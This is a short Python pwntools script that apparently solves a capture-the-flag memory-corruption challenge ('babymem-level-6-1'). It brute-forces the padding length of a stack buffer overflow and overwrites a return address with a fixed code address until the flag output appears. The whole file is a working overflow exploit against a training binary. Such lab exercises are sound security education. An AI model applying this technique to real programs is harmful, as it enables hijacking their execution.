from pwn import *
i = 10
while True:
    print("try "+ str(i))
    p = process('/challenge/babymem-level-6-1')
    p.sendline(b'512')
    p.send(b'A'*i + p32(0x401d4d)) #next_to_jne
    text = p.recvall().decode()
    if "pwn" in text:
        print(text)
        break
    i += 1